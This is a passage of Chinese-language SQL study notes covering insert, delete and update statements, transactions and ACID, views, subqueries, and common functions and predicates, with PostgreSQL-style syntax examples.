时，可以省略表名后的列清单。</p><h3 id="插入-null"><a href="#插入-null" class="headerlink" title="插入 null"></a>插入 null</h3><p>直接在 values 子句的值清单中写入 null.</p><p>想要插入 null 的列一定不能设置 not null 约束.</p><h3 id="插入默认值"><a href="#插入默认值" class="headerlink" title="插入默认值"></a>插入默认值</h3><p>在 create table 语句中设置 <code>default</code> 约束。</p><p>默认值的使用方法通常有显式和隐式两种.</p><ul><li>显式，在 <code>values</code> 子句中指定 <code>default</code> 关键字。 <code>values (&#39;0007&#39;, default, ...)</code></li><li>隐式，省略设定了默认值的列，列和值都要忽略<br>一般使用显式。</li></ul><h3 id="从其他表复制数据"><a href="#从其他表复制数据" class="headerlink" title="从其他表复制数据"></a>从其他表复制数据</h3><p>执行 <code>insert ... select</code> 语句。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function">insert <span class="hljs-keyword">into</span> <span class="hljs-title">Productcopy</span> (<span class="hljs-params">product_id, product_name, product_type, sale_price</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> product_id, product_name, product_type, sale_price</span><br><span class="hljs-function"><span class="hljs-keyword">from</span> Product</span>;<br></code></pre></td></tr></table></figure><p>insert 语句的 select 语句中，可以使用 where 子句或者 group by 子句等人和语法(使用 order by 子句并不会产生任何效果).</p><h2 id="4-2-数据的删除-delete语句的使用方法"><a href="#4-2-数据的删除-delete语句的使用方法" class="headerlink" title="4-2 数据的删除(delete语句的使用方法)"></a>4-2 数据的删除(delete语句的使用方法)</h2><h3 id="drop-table-语句和-delete-语句"><a href="#drop-table-语句和-delete-语句" class="headerlink" title="drop table 语句和 delete 语句"></a>drop table 语句和 delete 语句</h3><ul><li>drop table 语句可以将表完全删除</li><li>delete 语句会留下表(容器), 而删除表中的全部数据</li></ul><h3 id="delete-语句的基本语法"><a href="#delete-语句的基本语法" class="headerlink" title="delete 语句的基本语法"></a>delete 语句的基本语法</h3><p>语法:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="指定删除对象的-delete-语句-搜索型delete"><a href="#指定删除对象的-delete-语句-搜索型delete" class="headerlink" title="指定删除对象的 delete 语句(搜索型delete)"></a>指定删除对象的 delete 语句(搜索型delete)</h3><p>语法:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">where</span> &lt;expr&gt;;<br></code></pre></td></tr></table></figure><p>delete 语句中不能使用 <code>group by</code>、<code>having</code>和 <code>order by</code>.</p><h2 id="4-3-数据的更新-update语句的使用方法"><a href="#4-3-数据的更新-update语句的使用方法" class="headerlink" title="4-3 数据的更新(update语句的使用方法)"></a>4-3 数据的更新(update语句的使用方法)</h2><h3 id="update-语句的基本语法"><a href="#update-语句的基本语法" class="headerlink" title="update 语句的基本语法"></a>update 语句的基本语法</h3><p>用于更改数据.</p><p>语法:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;expr&gt;;<br></code></pre></td></tr></table></figure><p>将更新对象的列和更新后的值都记述在<code>set</code>子句中。</p><p>设置一整列.</p><h3 id="指定条件的-uupdate-语句-搜索型update"><a href="#指定条件的-uupdate-语句-搜索型update" class="headerlink" title="指定条件的 uupdate 语句(搜索型update)"></a>指定条件的 uupdate 语句(搜索型update)</h3><p>使用 <code>where</code> 子句:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;expr&gt;<br>  <span class="hljs-keyword">where</span> &lt;expr&gt;;<br></code></pre></td></tr></table></figure><h3 id="使用-null-进行更新"><a href="#使用-null-进行更新" class="headerlink" title="使用 null 进行更新"></a>使用 null 进行更新</h3><p>将赋值表达式右边的值直接写为 null。</p><p>使用 update 语句可以将值清空为 null(但只限于未设置 not null 约束的列).</p><h3 id="多列更新"><a href="#多列更新" class="headerlink" title="多列更新"></a>多列更新</h3><p>两种写法:</p><p>第一种:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> &lt;<span class="hljs-keyword">table</span> <span class="hljs-type">name</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;<span class="hljs-keyword">value</span>&gt;<br>  <span class="hljs-keyword">set</span> &lt;<span class="hljs-keyword">column</span> <span class="hljs-type">name</span>&gt; = &lt;<span class="hljs-keyword">value</span>&gt;<br>              .<br>              .<br>              .<br>  <span class="hljs-keyword">where</span> &lt;expr&gt;<br></code></pre></td></tr></table></figure><p>第二种:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">update <span class="hljs-variable">&lt;table name&gt;</span><br>  <span class="hljs-built_in">set</span> (<span class="hljs-variable">&lt;column name&gt;</span>, <span class="hljs-variable">&lt;column name&gt;</span>, ...) = (<span class="hljs-variable">&lt;value&gt;</span>, <span class="hljs-variable">&lt;value&gt;</span>, ...)<br>  where <span class="hljs-variable">&lt;expr&gt;</span><br></code></pre></td></tr></table></figure><p>通常使用第一种方法。</p><h2 id="4-4-事务"><a href="#4-4-事务" class="headerlink" title="4-4 事务"></a>4-4 事务</h2><h3 id="什么是事务-transaction"><a href="#什么是事务-transaction" class="headerlink" title="什么是事务(transaction)"></a>什么是事务(transaction)</h3><p>事务是需要在同一个处理单元中执行的一系列更新处理的集合。</p><p>一个处理单元就是表之类的，一系列更新处理就是修改操作。</p><h3 id="创建事务"><a href="#创建事务" class="headerlink" title="创建事务"></a>创建事务</h3><p>语法:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">事务开始语句 <span class="hljs-comment">;</span><br>  DML 语句① <span class="hljs-comment">;</span><br>  DML 语句② <span class="hljs-comment">;</span><br>  DML 语句③ <span class="hljs-comment">;</span><br>      .<br>      .<br>      .<br>事务结束语句（COMMIT 或者 ROLLBACK）<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>各个 DBMD 都定义有事务的开始语句:</p><ul><li>PostgreSQL: <code>begin transaction</code></li></ul><p>事务结束语句只有两种且通用:</p><ul><li>commit</li><li>rollback<br>事务开始有默认开始的时间点.</li></ul><h4 id="commit-提交处理"><a href="#commit-提交处理" class="headerlink" title="commit 提交处理"></a>commit 提交处理</h4><p>相当于文件处理中的覆盖处理。</p><h4 id="rollback-取消处理"><a href="#rollback-取消处理" class="headerlink" title="rollback 取消处理"></a>rollback 取消处理</h4><p>相当于文件处理中的放弃保存。</p><h4 id="事务处理何时开始"><a href="#事务处理何时开始" class="headerlink" title="事务处理何时开始"></a>事务处理何时开始</h4><p>实际上，几乎所有的数据库产品的事务都无需开始指令.</p><p>区分事务:</p><ul><li>每条SQL语句就是一个事务(自动提交模式)</li><li>直到用户执行commit或者rollback为止算作一个事务</li></ul><p>默认使用自动提交模式的 DBMS 有 SQL Server、PostgreSQL和MySQL等.</p><h3 id="ACID-特性"><a href="#ACID-特性" class="headerlink" title="ACID 特性"></a>ACID 特性</h3><p>DBMS 的事务都遵循四种特性，将这四种特性的首字母结合起来统称为 ACID 特性。</p><h4 id="原子性-Atomicity"><a href="#原子性-Atomicity" class="headerlink" title="原子性 Atomicity"></a>原子性 Atomicity</h4><p>指事务结束时，其中包含的更新要么全部执行，要么完全不执行。</p><h4 id="一致性-Consistency"><a href="#一致性-Consistency" class="headerlink" title="一致性 Consistency"></a>一致性 Consistency</h4><p>指事务中包含的处理，要满足数据库提前设置的约束, 如主键约束或者 not null 约束等。</p><h4 id="隔离性-Isolation"><a href="#隔离性-Isolation" class="headerlink" title="隔离性 Isolation"></a>隔离性 Isolation</h4><p>指的是保证不同事务之间互不干扰的特性。</p><h4 id="持久性-Durability"><a href="#持久性-Durability" class="headerlink" title="持久性 Durability"></a>持久性 Durability</h4><p>指在事务结束后，DBMS 能够保证该时间点的数据状态会被保存的特性。</p><p>常见为将执行记录(日志)保存在存储介质.</p><h1 id="第5章-复杂查询"><a href="#第5章-复杂查询" class="headerlink" title="第5章 复杂查询"></a>第5章 复杂查询</h1><h2 id="5-1-视图"><a href="#5-1-视图" class="headerlink" title="5-1 视图"></a>5-1 视图</h2><h3 id="视图和表"><a href="#视图和表" class="headerlink" title="视图和表"></a>视图和表</h3><p>视图和表的区别: 是否保存了实际数据。</p><p>使用视图时并不会将数据保存到存储设备中, 而且也不会将数据保存到其他任何地方.</p><p> 视图保存的是从表中取出数据所使用的 select 语句.</p><h4 id="视图的优点"><a href="#视图的优点" class="headerlink" title="视图的优点"></a>视图的优点</h4><ul><li>无需保存数据</li><li>将频繁使用的 select 语句保存成视图，就不用重新书写</li></ul><h3 id="创建视图的方法"><a href="#创建视图的方法" class="headerlink" title="创建视图的方法"></a>创建视图的方法</h3><p>使用 <code>create view</code> 语句:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">view</span> 视图名称(&lt;视图列名<span class="hljs-number">1</span>&gt;, &lt;视图列名<span class="hljs-number">2</span>&gt;, ......) <br><span class="hljs-keyword">as</span><br>&lt;<span class="hljs-keyword">select</span>语句&gt;<br></code></pre></td></tr></table></figure><p>select 语句中列的排列顺序和视图中列的排列顺序相同.</p><p>视图可以写在 select 语句的 from 中.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span><span class="hljs-keyword">column</span> name2<span class="hljs-operator">&gt;</span>, ...<br>  <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">view</span> name<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><h4 id="使用视图的查询"><a href="#使用视图的查询" class="headerlink" title="使用视图的查询"></a>使用视图的查询</h4><p>通常为两个步骤:</p><ol><li>执行定义视图的 select 语句</li><li>根据得到的结果，执行在 from 子句中使用的视图的 select 语句</li></ol><p>也就是说使用视图就是把视图放在 from 之后。</p><p>多重视图会降低 SQL 的性能.</p><h3 id="视图的限制1-–-定义视图时不能使用-order-by-子句"><a href="#视图的限制1-–-定义视图时不能使用-order-by-子句" class="headerlink" title="视图的限制1 – 定义视图时不能使用 order by 子句"></a>视图的限制1 – 定义视图时不能使用 order by 子句</h3><h3 id="视图的限制2-–-对视图进行更新"><a href="#视图的限制2-–-对视图进行更新" class="headerlink" title="视图的限制2 – 对视图进行更新"></a>视图的限制2 – 对视图进行更新</h3><p>定义视图的 select 语句满足某些条件，视图就可以被更新(即对视图使用 insert、delete、update等), 几个具有代表性的条件:</p><ol><li>select 子句中未使用 distinct</li><li>from 子句中只有一张表</li><li>未使用 group by 子句</li><li>未使用 having 子句<br>视图和表需要同时进行更新，因此通过汇总得到的视图无法进行更新.</li></ol><p>PostgreSQL 中的视图会被初始设定为只读, 若要允许更新:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">replace</span> rule insert_rule<br><span class="hljs-keyword">as</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">insert</span><br><span class="hljs-keyword">to</span> &lt;<span class="hljs-keyword">view</span> name&gt; <span class="hljs-keyword">do</span> instead<br><span class="hljs-keyword">insert</span>  <span class="hljs-keyword">into</span> ...<br></code></pre></td></tr></table></figure><h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><p>使用 drop view 语句:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">drop</span> <span class="hljs-built_in">view</span> &lt;<span class="hljs-built_in">view</span> name&gt;(&lt;视图列名<span class="hljs-number">1</span>&gt;, ...)<br></code></pre></td></tr></table></figure><p>删除多重视图，即存在关联的视图:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">view</span> &lt;<span class="hljs-keyword">view</span> <span class="hljs-type">name</span>&gt; <span class="hljs-keyword">cascade</span>;<br></code></pre></td></tr></table></figure><p><code>cascade</code> 是重叠的意思。</p><h2 id="5-2-子查询"><a href="#5-2-子查询" class="headerlink" title="5-2 子查询"></a>5-2 子查询</h2><p>子查询就是一次性视图。</p><p>子查询将用来定义视图的 select 语句直接用于 from 子句中.</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_type, cnt_product<br>  <span class="hljs-keyword">from</span> (<br>    <span class="hljs-keyword">select</span> product_type, <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">as</span> cnt_product<br>        <span class="hljs-keyword">from</span> Product<br>        <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> product_type<br>      ) <span class="hljs-keyword">as</span> ProductSum;<br></code></pre></td></tr></table></figure><p>这里的 <code>Productsum</code> 也是一次性名称.</p><p>select 语句的执行顺序，先执行 from 子句中的 select 语句，然后才执行外层的 select 语句。</p><h4 id="增加子查询的层数"><a href="#增加子查询的层数" class="headerlink" title="增加子查询的层数"></a>增加子查询的层数</h4><p>子查询的层数原则上没有限制.</p><p>尽量避免嵌套，其会使可读性和性能变差。</p><h3 id="子查询的名称"><a href="#子查询的名称" class="headerlink" title="子查询的名称"></a>子查询的名称</h3><p>原则上子查询必须设定名称, 需使用 as 关键词.</p><h3 id="标量子查询-scalar-subquery"><a href="#标量子查询-scalar-subquery" class="headerlink" title="标量子查询 scalar subquery"></a>标量子查询 scalar subquery</h3><h4 id="什么是标量"><a href="#什么是标量" class="headerlink" title="什么是标量"></a>什么是标量</h4><p>标量就是单一的意思.</p><p>标量子查询的特殊限制为: 必须而且只能返回1行1列的结果。</p><p>也就是返回表中某一行的某一列的值。</p><p>标量子查询的返回值可以用在 &#x3D; 或者 &lt;&gt; 这样需要单一值的比较运算符中.</p><h4 id="在-where-子句中使用标量子查询"><a href="#在-where-子句中使用标量子查询" class="headerlink" title="在 where 子句中使用标量子查询"></a>在 where 子句中使用标量子查询</h4><p>解决在 where 子句中不能使用聚合函数的问题.</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> product_id, product_name, sale_price<br>  <span class="hljs-keyword">from</span> Product<br>  <span class="hljs-keyword">where</span> sale_price &gt; (<span class="hljs-keyword">select</span> <span class="hljs-keyword">avg</span>(sale_price)<br>                        <span class="hljs-keyword">from</span> Product);<br></code></pre></td></tr></table></figure><p>执行顺序，首先执行内层的子查询，然后执行外层的查询。</p><h3 id="标量子查询的书写位置"><a href="#标量子查询的书写位置" class="headerlink" title="标量子查询的书写位置"></a>标量子查询的书写位置</h3><p>通常任何可以使用单一值的位置都可以使用。几乎所有的地方都可以使用.</p><h3 id="使用标量子查询时的注意事项"><a href="#使用标量子查询时的注意事项" class="headerlink" title="使用标量子查询时的注意事项"></a>使用标量子查询时的注意事项</h3><p>即该子查询不能返回多行结果。</p><h2 id="5-3-关联子查询"><a href="#5-3-关联子查询" class="headerlink" title="5-3 关联子查询"></a>5-3 关联子查询</h2><h3 id="普通子查询和关联子查询的区别"><a href="#普通子查询和关联子查询的区别" class="headerlink" title="普通子查询和关联子查询的区别"></a>普通子查询和关联子查询的区别</h3><h4 id="使用关联子查询的解决方案"><a href="#使用关联子查询的解决方案" class="headerlink" title="使用关联子查询的解决方案"></a>使用关联子查询的解决方案</h4><p>在子查询中添加的 where 子句的条件.</p><h3 id="关联子查询也是用来对集合进行切分的"><a href="#关联子查询也是用来对集合进行切分的" class="headerlink" title="关联子查询也是用来对集合进行切分的"></a>关联子查询也是用来对集合进行切分的</h3><h3 id="结合条件一定要写在子查询中"><a href="#结合条件一定要写在子查询中" class="headerlink" title="结合条件一定要写在子查询中"></a>结合条件一定要写在子查询中</h3><p>关联子查询就是有一个关联条件。</p><p>关联名称存在作用域.</p><h1 id="第6章-函数、谓词、CASE表达式"><a href="#第6章-函数、谓词、CASE表达式" class="headerlink" title="第6章 函数、谓词、CASE表达式"></a>第6章 函数、谓词、CASE表达式</h1><h2 id="6-1-各种各样的函数"><a href="#6-1-各种各样的函数" class="headerlink" title="6-1 各种各样的函数"></a>6-1 各种各样的函数</h2><h3 id="函数的种类"><a href="#函数的种类" class="headerlink" title="函数的种类"></a>函数的种类</h3><p>大致可以分为:</p><ul><li>算数函数</li><li>字符串函数</li><li>日期函数</li><li>转换函数</li><li>聚合函数</li></ul><h3 id="算数函数"><a href="#算数函数" class="headerlink" title="算数函数"></a>算数函数</h3><ul><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li><ul><li></li></ul></li><li>&#x2F;<br><code>numeric</code>数据类型, 格式为(全体位数，小数位数).</li></ul><h4 id="ABS-–-绝对值"><a href="#ABS-–-绝对值" class="headerlink" title="ABS – 绝对值"></a>ABS – 绝对值</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ABS</span><span class="hljs-params">(数值)</span></span><br></code></pre></td></tr></table></figure><p><code>abs</code> 是计算绝对值(absolute value)的函数.</p><p><code>abs</code> 计算出某一列的绝对值。</p><p>绝大多数函数对于 null 都返回null.</p><h4 id="MOD-–-求余"><a href="#MOD-–-求余" class="headerlink" title="MOD – 求余"></a>MOD – 求余</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">MOD</span><span class="hljs-params">(被除数，除数)</span></span><br></code></pre></td></tr></table></figure><p>只能对整数类型的列使用 <code>MOD</code> 函数。</p><h4 id="ROUND-–-四舍五入"><a href="#ROUND-–-四舍五入" class="headerlink" title="ROUND – 四舍五入"></a>ROUND – 四舍五入</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">ROUND</span></span>(对象数值，保留小数的位数)</span><br></code></pre></td></tr></table></figure><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><h4 id="–-拼接"><a href="#–-拼接" class="headerlink" title="|| – 拼接"></a>|| – 拼接</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">字符串<span class="hljs-number">1</span> <span class="hljs-string">|| 字符串2</span><br></code></pre></td></tr></table></figure><h4 id="LENGTH-–-字符串长度"><a href="#LENGTH-–-字符串长度" class="headerlink" title="LENGTH – 字符串长度"></a>LENGTH – 字符串长度</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">LENGTH</span></span>(字符串)</span><br></code></pre></td></tr></table></figure><p><code>LENGTH</code> 是以字节为单位.</p><h4 id="LOWER-–-小写转换"><a href="#LOWER-–-小写转换" class="headerlink" title="LOWER – 小写转换"></a>LOWER – 小写转换</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">LOWER</span><span class="hljs-params">(字符串)</span></span><br></code></pre></td></tr></table></figure><h4 id="UPPER-–-大写转换"><a href="#UPPER-–-大写转换" class="headerlink" title="UPPER – 大写转换"></a>UPPER – 大写转换</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">UPPER</span><span class="hljs-params">(字符串)</span></span><br></code></pre></td></tr></table></figure><h4 id="REPLACE-–-字符串替换"><a href="#REPLACE-–-字符串替换" class="headerlink" title="REPLACE – 字符串替换"></a>REPLACE – 字符串替换</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">REPLACE</span></span>(对象字符串，替换前字符串，替换后字符串)</span><br></code></pre></td></tr></table></figure><h4 id="SUBSTRING-–-字符串截取"><a href="#SUBSTRING-–-字符串截取" class="headerlink" title="SUBSTRING – 字符串截取"></a>SUBSTRING – 字符串截取</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">SUBSTRING</span></span>(对象字符串 <span class="hljs-variable">from</span> 截取的起始位置 <span class="hljs-variable">for</span> 截取的字符数)</span><br></code></pre></td></tr></table></figure><h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><h4 id="CURRENT-DATE-–-当前日期"><a href="#CURRENT-DATE-–-当前日期" class="headerlink" title="CURRENT_DATE – 当前日期"></a>CURRENT_DATE – 当前日期</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">current_date</span><br></code></pre></td></tr></table></figure><h4 id="CURRENT-TIME-–-当前时间"><a href="#CURRENT-TIME-–-当前时间" class="headerlink" title="CURRENT_TIME – 当前时间"></a>CURRENT_TIME – 当前时间</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">current_time</span><br></code></pre></td></tr></table></figure><h4 id="CURRENT-TIMESTAMP-–-当前日期和时间"><a href="#CURRENT-TIMESTAMP-–-当前日期和时间" class="headerlink" title="CURRENT_TIMESTAMP – 当前日期和时间"></a>CURRENT_TIMESTAMP – 当前日期和时间</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">current_timestamp</span><br></code></pre></td></tr></table></figure><h4 id="EXTRACT-–-截取日期元素"><a href="#EXTRACT-–-截取日期元素" class="headerlink" title="EXTRACT – 截取日期元素"></a>EXTRACT – 截取日期元素</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">EXTRACT</span><span class="hljs-params">(日期元素 from 日期)</span></span><br></code></pre></td></tr></table></figure><p>year, month, day, hour, minute, second.</p><h3 id="转换函数"><a href="#转换函数" class="headerlink" title="转换函数"></a>转换函数</h3><p>转换在 SQL 中主要有两层意思:</p><ol><li>数据类型的转换，即 cast</li><li>值的转换<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cast</span><span class="hljs-params">(转换前的值 as 想要转换的数据类型)</span></span><br></code></pre></td></tr></table></figure></li></ol><h4 id="COALESCE-–-将-null-转换为其他值"><a href="#COALESCE-–-将-null-转换为其他值" class="headerlink" title="COALESCE – 将 null 转换为其他值"></a>COALESCE – 将 null 转换为其他值</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">coalesce</span><span class="hljs-params">(数据<span class="hljs-number">1</span>，数据<span class="hljs-number">2</span>，...)</span></span><br></code></pre></td></tr></table></figure><p>返回可变参数中左侧开始第一个不是 null 的值。</p><p>感觉不是转换。</p><h2 id="6-2-谓词"><a href="#6-2-谓词" class="headerlink" title="6-2 谓词"></a>6-2 谓词</h2><h3 id="什么是谓词-predicate"><a href="#什么是谓词-predicate" class="headerlink" title="什么是谓词(predicate)"></a>什么是谓词(predicate)</h3><p>谓词是函数的一种，是需要满足特定条件的函数，该条件就是返回值是真值(true)。</p><p>&#x3D;, &lt;, &gt;, &lt;&gt; 等比较运算符，其正式名称就是比较谓词.</p><h3 id="LIKE-谓词-–-字符串的部分一致查询"><a href="#LIKE-谓词-–-字符串的部分一致查询" class="headerlink" title="LIKE 谓词 – 字符串的部分一致查询"></a>LIKE 谓词 – 字符串的部分一致查询</h3><p>部分一致大体可以分为:</p><ul><li>前方一致</li><li>中间一致</li><li>后方一致<br>部分一致，即字符串中的一部分相同。</li></ul><h4 id="前方一致查询"><a href="#前方一致查询" class="headerlink" title="前方一致查询"></a>前方一致查询</h4><p>用来查询的字符串，与查询对象的起始部分相同。</p><h4 id="中间一致"><a href="#中间一致" class="headerlink" title="中间一致"></a>中间一致</h4><p>用来查询的字符串，与查询对象的部分相同。</p><h4 id="后方一致"><a href="#后方一致" class="headerlink" title="后方一致"></a>后方一致</h4><p>用来查询的字符串，与查询对象的末尾部分相同。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <br>  <span class="hljs-keyword">from</span> SampleLike<br>  <span class="hljs-keyword">where</span> strcol <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;ddd%&#x27;</span><br></code></pre></td></tr></table></figure><p><code>%</code> 代表”0字符以上的任意字符串”.</p><p><code>_</code> 代表”任意一个字符”.</p><h3 id="BETWEEN-谓词-–-范围查询"><a href="#BETWEEN-谓词-–-范围查询" class="headerlink" title="BETWEEN 谓词 – 范围查询"></a>BETWEEN 谓词 – 范围查询</h3><p>使用3个参数:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> product_name, sale_price<br>  <span class="hljs-keyword">from</span> Product<br> <span class="hljs-keyword">where</span> sale_price <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">1000</span>;<br></code></pre></td></tr></table></figure><h3 id="IS-NULL、IS-NOT-NULL-–-判断是否为-NULL"><a href="#IS-NULL、IS-NOT-NULL-–-判断是否为-NULL" class="headerlink" title="IS NULL、IS NOT NULL – 判断是否为 NULL"></a>IS NULL、IS NOT NULL – 判断是否为 NULL</h3><h3 id="IN-谓词-–-OR-的简便用法"><a href="#IN-谓词-–-OR-的简便用法" class="headerlink" title="IN 谓词 – OR 的简便用法"></a>IN 谓词 – OR 的简便用法</h3><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">select</span> product_name, purchase_price<br>  <span class="hljs-keyword">from</span> Product<br> <span class="hljs-keyword">where</span> purchase_price I<span class="hljs-meta">N</span>(320, 500, 5000)<br></code></pre></td></tr></table></figure><p>其否定形式为 <code>NOT IN</code>.</p><p>IN 和 NOT IN 无法取出 NULL 数据。</p><h3 id="使用子查询作为-IN-谓词的参数"><a href="#使用子查询作为-IN-谓词的参数" class="headerlink" title="使用子查询作为 IN 谓词的参数"></a>使用子查询作为 IN 谓词的参数</h3><h4 id="IN-和子查询"><a href="#IN-和子查询" class="headerlink" title="IN 和子查询"></a>IN 